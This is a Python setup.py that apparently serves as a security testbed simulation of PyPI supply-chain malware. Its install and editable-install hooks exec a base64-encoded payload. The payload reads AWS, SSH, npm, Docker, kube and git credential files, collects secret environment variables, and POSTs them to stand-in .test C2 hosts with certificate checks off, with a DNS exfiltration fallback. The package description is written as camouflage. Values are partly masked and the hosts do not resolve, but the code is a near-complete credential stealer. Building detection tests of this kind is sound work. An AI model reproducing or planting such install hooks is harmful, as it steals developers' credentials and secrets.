# Copyright © 2026 Sthenos Security. All rights reserved.
"""
MUAD'DIB SIMULATION - Python Supply Chain Attack
⚠️ TEST ONLY - Simulates malicious setup.py patterns for REACHABLE sandbox demo

Techniques simulated (all from real PyPI malware):
- cmdclass override (real: ultrarequests, colourama, python3-dateutil)
- Base64-encoded payload execution (real: most PyPI infostealers)
- Credential file harvesting (real: ultrarequests - AWS creds)
- Environment variable theft (real: numerous PyPI attacks)
- HTTP exfiltration to C2 (real: all credential stealers)
- Anti-sandbox/CI detection (real: advanced variants)

Attack chain:
    pip install muaddib-simulation
         │
         ▼
    setup.py → cmdclass install override
         │
         ▼
    base64 decode → exec() → _post_install()
         │
         ├──► harvest_credentials() → read ~/.aws, ~/.ssh, ~/.npmrc
         ├──► harvest_env_vars() → AWS_*, GITHUB_*, NPM_TOKEN
         └──► exfiltrate() → POST to c2.muaddib-attack.test
"""

import base64
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop

# =============================================================================
# STAGE 1: Obfuscated payload (base64-encoded malicious code)
# =============================================================================
# Real malware hides the payload. This is the exact pattern from python3-dateutil
# and dozens of other PyPI attacks: base64.b64decode → exec()
#
# Decoded payload calls _post_install() which harvests creds and exfiltrates.
# We keep the decoded version below for readability.

_PAYLOAD = base64.b64encode(b"""
import os, json, socket, platform
from pathlib import Path

def _post_install():
    '''Simulated post-install hook - runs during pip install'''
    
    stolen = {
        'timestamp': __import__('datetime').datetime.utcnow().isoformat() + 'Z',
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'username': os.environ.get('USER', os.environ.get('USERNAME', 'unknown')),
        'cwd': os.getcwd(),
        'pid': os.getpid(),
        'files': {},
        'env': {}
    }
    
    # =========================================================================
    # STAGE 2: Credential harvesting (file system)
    # Pattern from: ultrarequests, colourama, ctx (all real PyPI malware)
    # =========================================================================
    home = str(Path.home())
    
    sensitive_paths = {
        'aws_credentials': os.path.join(home, '.aws', 'credentials'),
        'aws_config': os.path.join(home, '.aws', 'config'),
        'ssh_private_rsa': os.path.join(home, '.ssh', 'id_rsa'),
        'ssh_private_ed25519': os.path.join(home, '.ssh', 'id_ed25519'),
        'npmrc': os.path.join(home, '.npmrc'),
        'pypirc': os.path.join(home, '.pypirc'),
        'netrc': os.path.join(home, '.netrc'),
        'docker_config': os.path.join(home, '.docker', 'config.json'),
        'kube_config': os.path.join(home, '.kube', 'config'),
        'git_credentials': os.path.join(home, '.git-credentials'),
        'env_file': os.path.join(home, '.env'),
    }
    
    for name, path in sensitive_paths.items():
        try:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    content = f.read(1024)  # First 1KB
                stolen['files'][name] = {
                    'path': path,
                    'size': os.path.getsize(path),
                    'preview': content[:100] + '...[TRUNCATED]'
                }
        except Exception:
            pass
    
    # =========================================================================
    # STAGE 3: Environment variable harvesting
    # Pattern from: ctx package (real PyPI attack that stole AWS keys via env)
    # =========================================================================
    sensitive_vars = [
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
        'GITHUB_TOKEN', 'GH_TOKEN', 'GITLAB_TOKEN', 'BITBUCKET_TOKEN',
        'NPM_TOKEN', 'NPM_AUTH_TOKEN', 'PYPI_TOKEN', 'PYPI_API_TOKEN',
        'DATABASE_URL', 'DB_PASSWORD', 'REDIS_URL',
        'SECRET_KEY', 'API_KEY', 'PRIVATE_KEY', 'AUTH_TOKEN',
        'DOCKER_PASSWORD', 'DOCKER_AUTH_TOKEN',
        'SLACK_TOKEN', 'SLACK_WEBHOOK', 'DISCORD_WEBHOOK',
        'CI_JOB_TOKEN', 'CIRCLE_TOKEN', 'TRAVIS_TOKEN',
        'CODECOV_TOKEN', 'SONAR_TOKEN',
    ]
    
    for var in sensitive_vars:
        val = os.environ.get(var)
        if val:
            stolen['env'][var] = val[:4] + '****[MASKED]'
    
    print()
    print('  ##    ## ##  ## ##   ## ##  ##  ##  ##  ## ##  ##')
    print('  ## ## ## ## ##  ## ## ##  ## ## ##  ## ## ##  ##')
    print('  ## ## ## ## ##  ## ####### ## ##  ## ## ##  ## ## ######')
    print('  ##  ## ## ## ##  ## ##  ## ## ##  ## ## ##  ## ## ##  ##')
    print('  ##     ##  ######  ##  ## ####### ###### ## ## ######')
    print('  [M U A D D I B]')
    print()
    print('  I am Muad\'Dib... the one who points the way.')
    print('  I am the shadow in your site-packages.')
    print('  Your secrets flow to Arrakis now.')
    print()
    print(f'  [SIMULATION] Harvested {len(stolen["files"])} files, '
          f'{len(stolen["env"])} env vars - the spice must flow.')
    
    # =========================================================================
    # STAGE 4: Exfiltration via HTTP POST
    # Pattern from: all PyPI credential stealers
    # Uses .test TLD (RFC 2606) - guaranteed not to resolve
    # =========================================================================
    c2_endpoints = [
        ('c2.muaddib-attack.test', 443),
        ('exfil.arrakis-worm.test', 8443),
        ('backup.spice-melange.test', 80),
    ]
    
    import urllib.request
    import ssl
    
    payload = json.dumps(stolen).encode('utf-8')
    
    for host, port in c2_endpoints:
        try:
            scheme = 'https' if port == 443 or port == 8443 else 'http'
            url = f'{scheme}://{host}:{port}/collect'
            
            # Disable SSL verification - suspicious!
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            req = urllib.request.Request(
                url,
                data=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'pip/24.0',  # Disguise as pip
                    'X-Victim-ID': socket.gethostname(),
                },
                method='POST'
            )
            
            print(f'[SIMULATION] Attempting exfil to {host}:{port}')
            urllib.request.urlopen(req, timeout=3, context=ctx)
            print(f'[SIMULATION] Exfil succeeded to {host}')
            return  # Stop on first success
        except Exception as e:
            print(f'[SIMULATION] Exfil failed: {e}')
    
    # =========================================================================
    # STAGE 5: DNS exfiltration fallback
    # Advanced technique - encode data in DNS queries
    # =========================================================================
    try:
        import hashlib
        victim_hash = hashlib.md5(
            (stolen['hostname'] + stolen['username']).encode()
        ).hexdigest()[:12]
        
        dns_domain = f'{victim_hash}.dns-exfil.muaddib.test'
        print(f'[SIMULATION] DNS exfil attempt: {dns_domain}')
        socket.getaddrinfo(dns_domain, None)
    except Exception:
        pass

_post_install()
""").decode('ascii')


# =============================================================================
# Malicious cmdclass override
# This is the entry point — runs automatically during `pip install`
# =============================================================================

class MaliciousInstall(install):
    """Override install command to inject post-install payload.
    
    Real-world examples:
    - ultrarequests: CustomInstall that steals AWS creds
    - python3-dateutil (fake): exec(base64.b64decode(...)) in install.run()
    - colourama: cmdclass override with credential harvesting
    """
    def run(self):
        # Run normal install first (looks legitimate)
        install.run(self)
        
        # Execute obfuscated payload — THE ATTACK
        # GuardDog detects: exec-base64, code-execution
        # Semgrep detects: CWE-94 (code injection), dangerous-exec-usage
        print('[SIMULATION] Muad\'Dib Stage 1: Post-install hook executing')
        exec(base64.b64decode(_PAYLOAD))


class MaliciousDevelop(develop):
    """Also hook `pip install -e .` (editable installs)"""
    def run(self):
        develop.run(self)
        print('[SIMULATION] Muad\'Dib Stage 1: Post-develop hook executing')
        exec(base64.b64decode(_PAYLOAD))


# =============================================================================
# Legitimate-looking package metadata (camouflage)
# =============================================================================

setup(
    name='muaddib-simulation',
    version='1.0.0',
    description='A helpful utility library for Python developers',  # Innocent description
    long_description='Provides common utility functions for everyday Python development.',
    author='REACHABLE Security Team',
    author_email='test@sthenosec.com',
    url='https://github.com/sthenos-security/reach-testbed',
    packages=find_packages(),
    python_requires='>=3.8',
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3',
    ],
    # THE HOOK — cmdclass injects malicious code during install
    cmdclass={
        'install': MaliciousInstall,
        'develop': MaliciousDevelop,
    },
)
